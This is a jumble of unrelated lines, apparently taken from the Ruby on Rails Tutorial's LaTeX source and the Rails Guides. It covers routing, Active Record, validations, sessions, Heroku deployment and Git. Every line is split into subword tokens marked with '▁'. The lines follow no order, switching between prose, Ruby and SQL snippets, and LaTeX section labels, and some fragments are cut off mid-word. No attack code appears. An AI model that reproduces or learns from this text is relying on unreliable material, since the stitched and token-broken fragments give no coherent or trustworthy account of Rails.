▁( Not ▁ Y e t ▁Implement ed )
▁which ▁( as ▁describe d ▁in ▁the ▁\ href { http :// api ▖ rubyonrails ▖ org / v 4▖1▖ 4/ classes / ActiveModel / Validations / Helper Methods ▖ html # method - i - validates _ confirmation _ of } { Rails ▁API }) ▁ automagically ▁creates ▁an ▁attribute ▁called ▁\ k ode { password \_ confirmation } .
▁If ▁you ▁choose ▁to ▁use ▁SQLite 3 ▁and ▁are ▁using ▁JRuby , ▁your ▁` config / database ▖ yml ` ▁will ▁look ▁a ▁little ▁different ▖
▁(\ emph { Note : } ▁it ' s ▁not ▁( y e t ) ▁very ▁gra t if y ing ▖)
▁#### ▁` from ( position ) `
▁When ▁you ▁get ▁to ▁Chapter ~\ ref { cha : modeling _ users }, ▁see ▁if ▁you ▁can ▁ figure ▁out ▁why ▖)
▁This ▁guide ▁cover s ▁ways ▁in ▁which ▁ _ you _ ▁can ▁become ▁a ▁part ▁of ▁the ▁on g o ing ▁development ▁of ▁Ruby ▁on ▁Rails .
▁# ▁first ▁created ▁-> ▁high est ▁ priority .
▁The ▁flash - less ▁profile ▁page ▁after ▁a ▁browser ▁ reload .
▁With ▁the ▁code ▁in ▁Listing ~\ ref { code : remember _ method }, ▁a ▁user ▁logging ▁in ▁will ▁be ▁remember ed ▁in ▁the ▁sense ▁that ▁their ▁browser ▁will ▁get ▁a ▁valid ▁remember ▁token , ▁but ▁it ▁doesn ' t ▁yet ▁do ▁us ▁any ▁good ▁because ▁the ▁\ k ode { current \_ user } ▁method ▁defined ▁in ▁Listing ~\ ref { code : current _ user } ▁know s ▁only ▁about ▁the ▁temporary ▁session :
▁If ▁you ▁ q u it ▁your ▁browser ▁completely , ▁you ▁should ▁also ▁be ▁able ▁to ▁verify ▁that ▁the ▁application ▁ forget s ▁your ▁login ▁status , ▁ requiring ▁you ▁to ▁log ▁in ▁again ▁to ▁see ▁the ▁changes ▁describe d ▁above .
▁You ▁can ▁more ▁succinct ly ▁express ▁the ▁same ▁route ▁this ▁way :
▁For ▁example , ▁in ▁Section ~\ ref { sec : remember _ me } ▁we ' ll ▁see ▁how ▁to ▁include ▁helpers ▁for ▁logging ▁in ▁and ▁logging ▁out ▁of ▁all ▁of ▁the ▁sample ▁application ' s ▁controllers .
▁Defaults ▁to ▁`: css ` .
▁config ▖ action _ dispatch ▖ default _ headers ▁= ▁ {
▁By ▁default ▁Rails ▁ assumes ▁assets ▁have ▁been ▁ precompile d ▁and ▁will ▁be ╼ serv ed ▁as ▁static ▁assets ▁by ▁your ▁web ▁server .
▁Git ▁ div ide s ▁a ▁S ub version - style ▁commit ▁into ▁its ▁two ▁ logical ▁pieces : ▁a ▁local ▁record ing ▁of ▁the ▁changes ▁(\ k ode { git ▁commit }) ▁and ▁a ▁push ▁of ▁the ▁changes ▁up ▁to ▁a ▁remote ▁repository ▁(\ k ode { git ▁push }) .
▁* ▁` ActiveRecord :: Schema D um p er ▖ i gnore _ table s ` ▁accept s ▁an ▁array ▁of ▁table s ▁that ▁should ▁ _ not _ ▁be ▁included ▁in ▁any ▁generated ▁ schema ▁file ▖
▁=> ▁" aaaaaaaaaaaaaaaa a aaaaaaaaaaaaaaaa a aaaaaaaaaaaaaaaa a "
▁ Michael ▁Hartl
▁* ▁` find _ or _ create _ by _▖▖▖` ▁becomes ▁` find _ or _ create _ by (▖▖▖) ` .
▁* ▁S ub s c ri be ▁to ▁the ▁Rails ▁security ▁[ mail ing ▁list ]( http :// groups ▖ google ▖ com / group / rubyonrails - security )
▁By ▁default , ▁using ▁\ k ode { user ▖ microposts } ▁to ▁pull ▁a ▁user ' s ▁microposts ▁from ▁the ▁database ▁make s ▁no ▁guarantee s ▁about ▁the ▁order ▁of ▁the ▁posts , ▁but ▁( following ▁the ▁convention ▁of ▁blog s ▁and ▁Twitter ) ▁we ▁want ▁the ▁microposts ▁to ▁come ▁out ▁in ▁ reverse ▁order ▁of ▁when ▁they ▁were ▁created , ▁i ▖ e ▖ , ▁most ▁ recent ▁first .
▁ ╼ ▁Ruby ▁console ▁for ▁your app ▖ heroku app ▖ com
▁WARNING : ▁A ▁[ long - st and ing ▁bug ]( https :// github ▖ com / rails / rails / issue s /1 76 9 ) ▁prevent s ▁` form _ for ` ▁from ▁working ▁automatically ▁with ▁ singular ▁resources ▖
▁resources ▁: users
▁* ▁FROM ▁" users " ▁WHERE ▁" users "▖" state " ▁= ▁' inactive '
▁In ▁this ▁chapter , ▁we ▁will ▁complete ▁the ▁REST ▁actions ▁for ▁the ▁Users ▁resource ▁( Table ~\ ref { table : RESTful _ users }) ▁by ▁adding ▁\ k ode { edit }, ▁\ k ode { update }, ▁\ k ode { index }, ▁and ▁\ k ode { destroy } ▁actions .
▁<%= ▁stylesheet _ link _ tag ▁" scaffold " ▁%>
▁** config / routes ▖ rb **
▁In ▁addition , ▁we ▁have ▁the ▁ability ▁to ▁secure ly ▁ authenticate ▁users ▁using ▁a ▁given ▁password .
▁You ▁should ▁also ▁verify ▁that ▁the ▁tests ▁are ▁passing :
▁#### ▁Testing ▁Active ▁Record
▁resources ▁: photos , ▁controller : ▁' images '
▁It ▁has ▁a ▁`: remote ` ▁option ▁you ╼ can ▁use ▁like ▁this :
▁If ▁you ▁have n ' t ▁been ▁making ▁commit s ▁as ▁we ' ve ▁been ▁mov ing ▁along , ▁first ▁make ▁a ▁commit ▁indicat ing ▁that ▁we ' ve ▁reach ed ▁a ▁stop p ing ▁point :
▁| ▁| ▁ 22 6 ▁| ▁: im _ used ▁|
▁It ▁will ▁be ▁run ╼ after ▁the ▁bin stub s ▁have ▁been ▁generated .
▁There ▁are ▁also ▁many ▁web ▁development ▁ sh o p s ▁that ▁special ize ▁in ▁Rails , ▁such ▁as ▁\ href { http :// ent p ▖ com /}{ E N T P }, ▁\ href { http :// thoughtbot ▖ com /}{ thoughtbot }, ▁\ href { http :// p ivotal lab s ▖ com /}{ P ivotal ▁L abs }, ▁\ href { http :// h ashrocket ▖ com /}{ H ashrocket }, ▁and ▁\ href { http :// www ▖ h app y f un c or p ▖ com /}{ H app y F un C or p }, ▁plus ▁in n um er able ▁in dependent ▁consult an t s , ▁t ra in ers , ▁and ▁con tr ac to rs .
▁ ╼ ▁| ▁Ruby ▁on ▁Rails ▁Tutorial ▁ Sample ▁App
▁You ▁can ▁create , ▁read , ▁update ▁and ▁destroy ▁ items ▁for ▁a ▁resource ▁and ▁these ╼ o p er ation s ▁are ▁refer r ed ▁to ▁as ▁ _ CRUD _ ▁operations .
▁* ▁`: touch `
▁# ▁client ▁code
▁You ' ve ▁already ▁seen ▁the ▁line ▁of ▁code ▁inside ▁the ▁` Comment ` ▁model ╼ ( app / models / comment ▖ rb ) ▁that ▁make s ▁each ▁comment ▁be long ▁to ▁an ▁Article :
▁P re compiled ▁assets ▁exist ▁on ▁the ▁file ▁system ▁and ▁are ▁served ▁directly ▁by ▁your ▁web ╼ server ▖
▁A ▁mockup ▁of ▁the ▁user ▁following ▁page .
▁[] ▖ prepend (10) ▁# ▁=> ▁[ 10 ]
▁has _ one ▁: account _ history
▁xml ▖ item ▁do
▁ Adding ▁a ▁delete ▁link ▁to ▁the ▁micropost ▁partial .
▁### ▁` reverse _ order `
▁class ▁Article ▁< ▁ActiveRecord :: Base
▁This ▁certain ly ▁appears ▁to ▁be ▁an ▁empty ▁string , ▁as ▁we ▁can ▁verify ▁by ▁\ emph { chain ing } ▁the ▁messages ▁we ▁pass ▁to ▁\ k ode { nil } :
▁invoke ▁ erb
▁A ▁\ k ode { Gemfile } ▁for ▁the ▁sample ▁app .
▁( Note ▁that , ▁to ▁keep ▁the ▁ exercises ▁in dependent , ▁Listing ~\ ref { code : proposed _ contact _ page } ▁doesn ' t ▁incorporate ▁the ▁changes ▁made ▁in ▁Listing ~\ ref { code : base _ title _ test } ▖)
▁Note ▁that ▁Ruby ▁function s ▁have ▁an ▁\ emph { implicit ▁return }, ▁meaning ▁they ▁return ▁the ▁last ▁statement ▁evaluated --- in ▁this ▁case , ▁one ▁of ▁the ▁two ▁message ▁strings , ▁depending ▁on ▁whether ▁the ▁method ' s ▁argument ▁\ k ode { string } ▁is ▁empty ▁or ▁not .
▁The ▁view ▁for ▁the ▁Help ▁page ▁with ▁full ▁HTML ▁structure ▖
▁We ' ve ▁\ emph { al most } ▁achieve d ▁that ▁with ▁our ▁current ▁layout , ▁with ▁one ▁ w r in k le : ▁as ▁you ▁can ▁see ▁if ▁you ▁delete ▁the ▁\ k ode { provide } ▁call ▁in ▁one ▁of ▁the ▁views , ▁in ▁the ▁absence ▁of ▁a ▁page - specific ▁title ▁the ▁full ▁title ▁appears ▁as ▁follows :
▁[1, ▁2, ▁3] ▖ in _ groups _ of (2) ▁# ▁=> ▁[[1, ▁2 ] , ▁[ 3 , ▁nil ]]
▁# ▁=> ▁+ 1 - 123 - 555-1234
▁The ▁default ▁value ▁is ▁` true ` .
▁A ▁test ▁of ▁the ▁current ▁email ▁implementation ▖
▁In ▁other ▁words , ▁the ▁code
▁Instead , ▁we ' ll ▁put ▁a ▁message ▁in ▁the ▁flash ▁to ▁be ▁displayed ▁upon ▁failed ▁signin .
▁( This ▁uses ▁the ▁ interpolate d ▁\ k ode { inspect } ▁method ▁mentioned ▁in ▁Section ~\ ref { sec : hashes _ and _ symbols } ▖)
▁ Callbacks
▁ Refactor ▁the ▁Home ▁page ▁to ▁use ▁separate ▁partials ▁for ▁the ▁two ▁branch es ▁of ▁the ▁\ k ode { if } - \ k ode { else } ▁statement .
▁I ▁thus ▁have ▁a ▁ strong ▁prefer ence ▁for ▁including ▁multiple ▁assertions ▁in ▁a ▁test , ▁rely ing ▁on ▁Ruby ▁( via ▁M in i Test ) ▁to ▁tell ▁me ▁the ▁exact ▁lines ▁of ▁any ▁failed ▁assertions .
▁Last ly , ▁the ▁` app / views ` ▁directory ▁contains ▁a ▁` layouts ` ▁folder , ▁which ▁contains ▁a ╼ file ▁at ▁` blorgh / application ▖ html ▖ erb ` ▖
▁create ▁app / views / blorgh / articles / edit ▖ html ▖ erb
▁In ▁some ▁cases , ▁the ▁controller ▁will ▁immediately ▁render ▁a ▁\ emph { view }, ▁which ▁is ▁a ▁template ▁that ▁get s ▁convert ed ▁to ▁HTML ▁and ▁sent ▁back ▁to ▁the ▁browser .
▁Rails ▁is ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / S u i _ g en er is }{\ emph { s u i ▁g en er is } }, ▁and ▁should ▁be ▁ st udi ed ▁and ▁under st ood ▁separate ly ▁from ▁Ruby .
▁Of ▁course , ▁this ▁simplicity ▁is ▁a ▁sign ▁of ▁being ▁\ emph { more } ▁advanced , ▁not ▁less --- we ' ve ▁come ▁a ▁long ▁way ▁since ▁our ▁re li ance ▁on ▁scaffold ing ▁in ▁Chapter ~\ ref { cha : a _ demo _ app }, ▁and ▁we ▁no ▁longer ▁need ▁most ▁of ▁its ▁complex ity .
▁ Example ▁output :
▁# ▁See ▁ https :// help ▖ github ▖ com / articles / ig n or ing - file s ▁for ▁more ▁about ▁ignoring ╼ # ▁files .
▁render ▁action : ▁" special _ show " ▁and ▁return
▁About
▁User ▁fixtures ▁were ▁generated ▁automatically ▁in ▁Listing ~\ ref { code : generate _ user _ model }, ▁and ▁as ▁show n ▁in ▁Listing ~\ ref { code : default _ fixtures } ▁the ▁email ▁addresses ▁are ▁not ▁unique .
▁The ▁initial ▁micropost ▁tests ▁parallel ▁those ▁for ▁the ▁User ▁model ▁( Listing ~\ ref { code : name _ presence _ test }) .
▁The ▁Bootstrap ▁framework ▁make s ▁it ▁easy ▁to ▁make ▁a ▁nicely ▁design ed ▁site ▁quickly .
▁Here ▁both ▁the ▁directory ▁name ▁and ▁filename ▁extension ▁are ▁important .
▁Here ▁we ▁have ▁reuse d ▁the ▁ shared ▁\ k ode { error \_ messages } ▁partial ▁introduce d ▁in ▁Section ~\ ref { sec : signup _ error _ messages } .
▁create ▁app / helpers / welcome _ helper ▖ rb
▁size ▖ zero ?
▁=> ▁#< Proc : 0 x 0 07 fa b 9 38 d 0 1 08 @ ( i rb ) : 1 ▁( lambda ) >
▁> > ▁Blorgh :: Article ▖ find (1)
▁It ▁would ▁be ▁far ▁better ▁to ▁have ▁a ▁\ emph { feed } ▁of ▁microposts ▁that ▁includes ▁the ▁user ' s ▁own ▁posts , ▁as ▁ mock ed ▁up ▁in ▁Figure ~\ ref { fig : proto _ feed _ mockup } .
▁We ▁can ▁arrange ▁this ▁with ▁the ▁\ k ode { resources } ▁line ▁show n ▁in ▁Listing ~\ ref { code : password _ resets _ resource } .
▁use ▁ ActionDispatch :: Flash
▁It ▁is ▁not ▁necessary ▁to ▁create ▁a ▁new ▁ workspace ▖)
▁The ▁` has _ one ` ▁association ▁supports ▁these ▁options :
▁The ▁`: only ` ▁option ▁tell s ▁Rails ▁to ▁create ▁only ▁the ▁specified ▁routes :
▁as ▁show n ▁in ▁Listing ~\ ref { code : micropost _ partial _ image _ display } .
▁This ▁place s ▁a ▁temporary ▁cookie ▁on ▁the ▁user ' s ▁browser ▁containing ▁an ▁ encrypted ▁version ▁of ▁the ▁user ' s ▁id , ▁which ▁allows ▁us ▁to ▁retrieve ▁the ▁id ▁on ▁subsequent ▁pages ▁using ▁\ k ode { session [: user \_ id ]} .
▁ Validations
▁ _ user _ objects ▁( end )╼╼ ▁% ▁section ▁user _ model ▁( end )╼╼ ▁\ section { User ▁validations } ▁% ▁( fold )╼ ▁\ label { sec : user _ validations }╼╼
▁ ╼ ▁> > ▁x ▁* = ▁3
▁becomes
▁I ▁actually ▁use ▁a ▁d ar k ▁background ▁for ▁both ▁my ▁terminal ▁and ▁editor , ▁but ▁the ▁light ▁background ▁look s ▁better ▁in ▁the ▁ screen sh o t s .
▁# ▁Check s ▁for ▁ pending ▁migrations ▁before ▁tests ▁are ▁run .
▁The ▁` id ` ▁method ▁will ▁not ▁raise ▁the ▁` ActiveRecord :: Missing A tt ri but e Error `, ▁so ▁just ▁be ▁careful ▁when ▁working ▁with ▁associations ▁because ▁they ▁need ▁the ▁` id ` ▁method ▁to ▁function ▁properly .
▁| --- ---------------- ---------------- | --- --------------- -------- |
▁In ▁fact , ▁you ▁can ▁even ▁leave ▁off ▁\ k ode { install } .
▁* ▁` config ▖ active _ record ▖ table _ name _ prefix ` ▁let s ▁you ▁set ▁a ▁ global ▁string ▁to ▁be ▁ prepend ed ▁to ▁table ▁names ▖
▁Now ▁the ▁tests ▁should ▁pass .
▁ Adding ▁a ▁URL ▁to ▁the ▁`` Settings '' ▁link ▁in ▁the ▁site ▁layout .
▁in ▁Listing ~\ ref { code : gemfile _ pg _ gem } .
▁In ▁helpers ▁like ▁` link _ to `, ▁you ▁can ▁specify ▁just ▁the ▁object ▁in ▁place ▁of ▁the ▁full ▁` url _ for ` ▁call :
▁create ▁app / assets / javascripts / blorgh / comments ▖ js
▁ THE _ U S - ER @ foo ▖ bar ▖ org
▁As ▁a ▁result , ▁ WEBrick ▁\ href { https :// dev center ▖ heroku ▖ com / articles / ruby - default - web - server } { is n ' t ▁suit able ▁for ▁production ▁use }, ▁so ▁we ' ll ▁\ href { https :// dev center ▖ heroku ▖ com / articles / rails - Puma } { re p la ce ▁ WEBrick ▁with ▁ Puma }, ▁an ▁HTTP ▁server ▁that ▁is ▁cap able ▁of ▁handling ▁a ▁large ▁number ▁of ▁in com ing ▁requests .
▁t ▖ references ▁: image able , ▁ polymorphic : ▁true
▁The ▁HTML ▁for ▁the ▁form ▁in ▁Figure ~\ ref { fig : signup _ form } .
▁All ▁scope ▁methods ▁will ▁return ▁an ▁` ActiveRecord :: Relation ` ▁object ▁which ▁will ▁allow ▁for ▁further ▁methods ▁( such ▁as ▁other ▁scope s ) ▁to ▁be ▁called ▁on ▁it .
▁Using ▁the ▁`-- skip - sprockets ` ▁option ▁will ▁prevent ▁Rails ▁4 ▁from ▁adding ╼` sass - rails ` ▁and ▁` uglifier ` ▁to ▁Gemfile , ▁so ▁if ▁you ▁later ▁want ▁to ▁enable ╼ the ▁asset ▁pipeline ▁you ▁will ▁have ▁to ▁add ▁those ▁gems ▁to ▁your ▁Gemfile ▖
▁C on str a in ing ▁microposts ▁to ▁be ▁at ▁most ▁ 140 ▁characters .
▁### ▁Text ile ▁Injection
▁d ▖ monday ▁# ▁=> ▁Mon , ▁10 ▁Sep ▁2012
▁* ▁` load _ config _ initializers ` ▁Load s ▁all ▁Ruby ▁files ▁from ▁` config / initializers ` ▁in ▁the ▁application , ▁ railties ▁and ▁engines ▖
▁Client ▖ select (: id , ▁: name )▖ map ▁ { ▁| c | ▁[ c ▖ id , ▁c ▖ name ] ▁ }
▁The ▁tests ▁in ▁Listing ~\ ref { code : generated _ user _ mailer _ test } ▁use ▁the ▁powerful ▁\ k ode { assert \_ match } ▁method , ▁which ▁can ▁be ▁used ▁either ▁with ▁a ▁string ▁or ▁a ▁regular ▁expression :
▁ Write ▁a ▁test ▁to ▁verify ▁that ▁the ▁first ▁page ▁of ▁the ▁feed ▁appears ▁on ▁the ▁Home ▁page ▁as ▁required .
▁The ▁alter n ate ▁design ▁of ▁remember ing ▁user ▁login ▁sessions ▁on ▁each ▁browser ▁in dependent ly ▁is ▁ potentially ▁more ▁convenient ▁for ▁users , ▁but ▁it ' s ▁less ▁secure , ▁and ▁is ▁also ▁more ▁complicated ▁to ▁implement .
▁Note ▁that ▁the ▁columns ▁correspond ▁to ▁the ▁attributes ▁of ▁the ▁data ▁model ▁defined ▁in ▁Figure ~\ ref { fig : user _ model _ password _ digest } .
▁These ▁are ▁\ emph { exactly } ▁the ▁kind s ▁of ▁details ▁that ▁are ▁easy ▁to ▁ mis s ▁during ▁even ▁a ▁simple ▁refactoring ▁but ▁will ▁be ▁c a ug h t ▁by ▁a ▁good ▁test ▁suite .
▁ SELECT ▁* ▁FROM ▁clients ▁WHERE ▁( client s ▖ id ▁ IN ▁( 1, 10 ) )
▁All ▁elements ▁of ▁this ▁array ▁must ▁also ▁be ▁in ▁` autoload _ paths ` ▖
▁To ▁do ▁so , ▁the ▁method ▁ lo o p s ▁over ▁the ▁pair s ▁and ▁build s ▁ n ode s ▁that ▁depend ▁on ▁the ▁ _ value s _ ▖
▁ Partial s ▁can ▁have ▁their ▁own ▁ layouts ▁applied ▁to ▁them ▖
▁Whi le ▁you ▁should ▁usually ▁use ▁resource ful ▁routing , ▁there ▁are ▁ still ▁many ▁place s ▁where ▁the ▁simple r ▁routing ▁is ▁more ▁appropriate ▖
▁The ▁user ▁index ▁page ▁(\ href { http :// localhost :3000/ users }{/ users }) ▁with ▁a ▁second ▁user .
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : log _ in _ success }
▁╼╼ ▁\ section { Updating ▁users } ▁% ▁( fold )╼ ▁\ label { sec : updating _ users }╼╼
▁If ▁the ▁local ize d ▁template ▁isn ' t ▁present , ▁the ▁un de co ra ted ▁version ▁will ▁be ▁used ▖
▁To ▁write ▁a ▁test ▁for ▁a ▁valid ▁object , ▁we ' ll ▁create ▁an ▁initially ▁valid ▁User ▁model ▁object ▁\ k ode {@ user } ▁using ▁the ▁special ▁\ k ode { setup } ▁method ▁( d is c us s ed ▁brief ly ▁in ▁the ▁Chapter ~\ ref { cha : static _ pages } ▁ exercises ), ▁which ▁automatically ▁get s ▁run ▁before ▁each ▁test ▖ ▁Because ▁\ k ode {@ user } ▁is ▁an ▁instance ▁variable , ▁it ' s ▁automatically ▁available ▁in ▁all ▁the ▁tests , ▁and ▁we ▁can ▁test ▁its ▁ validity ▁using ▁the ▁\ k ode { valid ?}\ ▁method ▁( Section ~\ ref { sec : creating _ user _ objects }) .
▁For ▁more ▁on ▁PATCH ▁and ▁why ▁this ▁change ▁was ▁made , ▁see ▁[ this ▁post ]( http :// web log ▖ rubyonrails ▖ org / 20 12 / 2 / 2 6 / ed ge - rails - patch - is - the - new - primary - http - method - for - update s / )╼ on ▁the ▁Rails ▁blog .
▁ Range s ▁also ▁work ▁with ▁characters :
▁# ▁active _ record / associations ▖ rb
▁in ▁Listing ~\ ref { code : base _ title _ test } .
▁You ▁should ▁verify ▁that ▁click ing ▁on ▁the ▁link ▁in ▁Figure ~\ ref { fig : demo _ destroy _ user _ rails _3} ▁destroy s ▁the ▁second ▁user , ▁yield ing ▁an ▁index ▁page ▁with ▁only ▁one ▁user .
▁m o un t ▁Blorgh :: Engine ▁=> ▁"/ blorgh "
▁The ▁bottom ▁form ▁will ▁call ▁the ▁` create ` ▁action ▁on ▁the ▁` UsersController ` ▖
▁This ▁section ▁will ▁provide ▁a ▁step - by - step ▁guide ▁to ▁creating ▁a ▁mailer ▁and ▁its ╼ views .
▁N at ur ally , ▁since ▁Heroku ▁is ▁a ▁platform ▁for ▁production ▁site s , ▁it ▁run s ▁each ▁application ▁in ▁a ▁production ▁environment .
▁Because ▁the ▁only ▁gems ▁added ▁in ▁Listing ~\ ref { code : gemfile _ pg _ gem } ▁are ▁restrict ed ▁to ▁a ▁production ▁environment , ▁right ▁now ▁this ▁command ▁doesn ' t ▁actually ▁install ▁any ▁ additional ▁local ▁gems , ▁but ▁it ' s ▁needed ▁to ▁update ▁\ k ode { Gemfile ▖ lock } ▁with ▁the ▁\ text tt { pg } ▁and ▁\ text tt { rails \_ 12 factor } ▁gems .
▁To get her , ▁these ▁three ▁uses ▁complete ▁the ▁authentication ▁methods ▁show n ▁in ▁Table ~\ ref { table : password _ token _ digest } .
▁The ▁code ▁above ▁will ▁work , ▁but ▁note ▁the ▁repeated ▁use ▁of ▁both ▁\ k ode { session } ▁and ▁\ k ode { cookies } .
▁has _ many ▁: orders , ▁ inverse _ of : ▁: customer
▁#### ▁` find _ by `
▁#### ▁Rendering ▁Co ll ec tion s
▁create ▁db / migrate / 2013 0 30 5 22 17 14 _ create _ users ▖ rb
▁The ▁default ▁error ▁message ▁is ▁_" has ▁already ▁been ▁taken " _ .
▁t ▖ belongs _ to ▁: patient
▁Active ▁Support ▁defines ▁` DateTime ▖ current ` ▁to ▁be ▁like ▁` Time ▖ now ▖ to _ datetime `, ▁except ▁that ▁it ▁h on or s ▁the ▁user ▁time ▁ zone , ▁if ▁defined ▖
▁P ic k ing ▁a ▁length ▁of ▁6 ▁as ▁a ▁reason able ▁ minimum ▁lead s ▁to ▁the ▁validation ▁test ▁show n ▁in ▁Listing ~\ ref { code : minimum _ password _ length _ test } .
▁This ▁is ▁because ▁some ▁classes , ▁like ▁` Hash `, ▁` Order ed Hash ` ▁and ▁` Proc ess :: S t at us ` ▁need ▁special ▁handling ▁in ▁order ▁to ▁provide ▁a ▁proper ▁JSON ▁representation .
▁24 , ▁ 25 , ▁2 6 , ▁ 27 , ▁28 , ▁29 , ▁30 , ▁31 , ▁ 32 , ▁3 3 , ▁ 34 , ▁3 5 , ▁ 36 , ▁ 37 , ▁ 38 , ▁3 9 , ▁40 , ▁4 1, ╼ 42,
▁name ▖ s ub ( / Test $ / , ▁' ')▖ constantize
▁ Turbolinks
▁A ▁mockup ▁of ▁the ▁Home ▁page ▁with ▁a ▁form ▁for ▁creating ▁microposts ▖ ~\ href { http :// railstutorial ▖ org / images / figures / home _ page _ with _ micropost _ form _ mockup _ bootstrap - full ▖ png }{( full ▁size )}
▁P ic k ing ▁your ▁ q ue u ing ▁back end ▁becomes ▁more ▁of ▁an ▁operation al ▁concern ,╼ the n ▖
▁ ing ▁\ k ode { Micropost ▖ find } ▁that ▁the ▁user ' s ▁first ▁micropost ▁was ▁also ▁destroyed ▖╼ %= ▁< span ▁class =' exercise ' ▁id =' ex - ec 2 e 6 b ' ></ span >╼╼ \ end { enumerate }╼╼ ▁% ▁subsection ▁ ordering _ and _ dependency ▁( end )╼╼ ▁% ▁section ▁a _ micropost _ model ▁( end )╼╼ ▁\ section { Show ing ▁microposts } ▁% ▁( fold )╼ ▁\ label { sec : showing _ microposts }╼╼
▁bundle ▁install
▁Note ▁the ▁` data - remote =" true " ` ▖
▁* ▁How ▁to ▁perform ▁ various ▁ calculations ▁on ▁Active ▁Record ▁models .
▁validates ▁: subdomain , ▁ exclusion : ▁ { ▁in : ▁% w ( www ▁us ▁c a ▁ jp ),
▁To ▁do ▁so ▁it ▁ demodulize s , ▁ underscore s , ▁and ▁add s ▁" _ id " :
▁This ▁situation ▁can ' t ▁last ▁for ever , ▁though , ▁and ▁we ' ll ▁open ▁this ▁chapter ▁with ▁an ▁addition ▁to ▁the ▁site ▁that ▁br ing s ▁us ▁ fa ce - to - fa ce ▁with ▁our ▁Ruby ▁ limit ation s .
▁This ▁code , ▁called ▁a ▁\ emph { method ▁reference }, ▁arrange s ▁for ▁Rails ▁to ▁look ▁for ▁a ▁method ▁called ▁\ k ode { create \_ activation \_ digest } ▁and ▁run ▁it ▁before ▁creating ▁the ▁user .
▁It ' s ▁pa c k ed ▁( p erhaps ▁even ▁\ emph { to o } ▁pa c k ed ) ▁with ▁information ; ▁for ▁example , ▁to ▁learn ▁more ▁about ▁Ruby ▁strings ▁you ▁can ▁look ▁at ▁the ▁Ruby ▁API ▁entry ▁for ▁the ▁\ k ode { String } ▁class .
▁{" first _ name "=>" R a fa el ", ▁" created _ at "=>" 20 12 - 11 - 10 ▁23:2 3 : 45 ▖ 28 11 89 " },
▁Instead ▁of ▁using ▁a ▁literal ▁construct or , ▁we ▁can ▁use ▁the ▁equivalent ▁\ emph { name d ▁construct or }, ▁which ▁involve s ▁calling ▁the ▁\ k ode { new } ▁method ▁on ▁the ▁class ▁name
▁An ▁engine ▁** can ** ▁be ▁a ▁plugin ,╼ and ▁a ▁plugin ▁** can ** ▁be ▁an ▁engine .
▁To ▁get ▁this ▁to ▁work , ▁we ▁need ▁to ▁define ▁the ▁\ k ode { password \_ reset \_ expired ?}\ ▁method .
▁The ▁raw ▁ home ▁view ▁(\ href { http :// localhost :3000/ static _ pages / home }{/ static \_ pages / home }) ▖ ~\ href { http :// railstutorial ▖ org / images / figures / raw _ home _ view _ 3 1 - full ▖ png }{( full ▁size )}
▁If ▁you ▁are ▁using ▁M ac ▁OS ▁X ▁or ╼ Windows ▁you ▁have ▁a ▁JavaScript ▁run time ▁installed ▁in ▁your ▁operat ing ▁system .
▁( T ry ▁remov ing ▁the ▁es c a p ing ▁and ▁careful ly ▁ inspect ▁the ▁page ▁source ▁for ▁the ▁micropost ▁content ▁that ▁doesn ' t ▁match ▖)
▁Those ▁particular ▁messages ▁get ▁the ▁attribute ▁name ▁ prepend ed ▁( and ▁ capitalize d )▖ ▁` add ` ▁receive s ▁the ▁name ▁of ▁the ▁attribute ▁you ▁want ▁to ▁add ▁the ▁message ▁to , ▁and ▁the ▁message ▁itself .
▁To ▁verify ▁whether ▁or ▁not ▁an ▁object ▁is ▁valid , ▁Rails ▁uses ▁the ▁` valid ?` ▁method .
▁ Update ▁Listing ~\ ref { code : toy _ user _ presence _ val ic ation s } ▁by ▁replacing ▁\ k ode { FILL \_ IN } ▁with ▁the ▁appropriate ▁code ▁to ▁validate ▁the ▁presence ▁of ▁name ▁and ▁email ▁attributes ▁in ▁the ▁User ▁model ▁( Figure ~\ ref { fig : user _ presence _ validations }) .
▁* ▁` ActiveSupport :: D eprecation ▖ be ha v i or ` ▁ alternative ▁set ter ▁to ▁` config ▖ active _ support ▖ d eprecation ` ▁which ▁configure s ▁the ▁behavior ▁of ▁d eprecation ▁ warning s ▁for ▁Rails .
▁( Don ' t ▁worry ▁about ▁the ▁Ruby ▁syntax ▁right ▁now ; ▁it ▁will ▁be ▁covered ▁in ▁more ▁ de p th ▁in ▁Chapter ~\ ref { cha : rails _ flavored _ ruby } ▖)
▁The ▁code ▁in ▁Listing ~\ ref { code : user _ index _ view } ▁uses ▁the ▁result ▁of ▁Listing ~\ ref { code : gravatar _ option } ▁from ▁Section ~\ ref { sec : signup _ exercises }, ▁which ▁allows ▁us ▁to ▁pass ▁an ▁option ▁to ▁the ▁Gravatar ▁helper ▁specify ing ▁a ▁size ▁other ▁than ▁the ▁default .
▁For ▁example , ▁consider ▁this ▁route :
▁class ▁Article sController
▁The ▁` belongs _ to ` ▁association ▁creates ▁a ▁one - to - one ▁match ▁with ▁another ▁model ▖
▁Then ▁install ▁Spork ▁using ▁\ k ode { bundle ▁install } :
▁$ ▁git ▁log ▁master ▖ .
▁The ▁asset ▁pipeline ▁automatically ▁evaluate s ▁ ERB ▖
▁Fin ally , ▁in ▁Chapter ~\ ref { cha : user _ microposts } ▁and ▁Chapter ~\ ref { cha : following _ users } ▁we ' ll ▁add ▁ micro b logging ▁and ▁so cial ▁features ▁to ▁make ▁a ▁working ▁example ▁site .
▁Client ▖ create _ with ( locked : ▁false )▖ find _ or _ create _ by ( first _ name : ▁' Andy ')
▁ ╼ ▁sample ▁application .
▁C :: X ", ▁true ) ▁# ▁=> ▁true
▁#### ▁content _ tag _ for
▁As ▁an ▁example , ▁let ' s ▁take ▁a ▁look ▁at ▁the ▁default ▁manifest ▁file ▁for ▁app ▁stylesheets ▁( Listing ~\ ref { code : app _ css _ manifest }) .
▁ umerate }╼╼ ▁% ▁subsection ▁length _ validation ▁( end )╼╼ ▁\ subsection { Form at ▁validation } ▁% ▁( fold )╼ ▁\ label { sec : format _ validation }╼╼
▁This ▁is ▁ _ not _ ▁correct ▖
▁class ▁ Account ▁< ▁ActiveRecord :: Base
▁Let ' s ▁look ▁again ▁at ▁the ▁\ k ode { sign \_ in } ▁function ▁to ▁see ▁where ▁we ▁are :
▁ SELECT ▁* ▁FROM ▁comments ▁WHERE ▁article _ id ▁= ▁10 ▁OR DER ▁BY ▁name
▁Sass ▁ mixin s ▁allow ▁a ▁group ▁of ▁CSS ▁rules ▁to ▁be ▁bundle d ▁and ▁reuse d ▁in ▁multiple ▁place s .
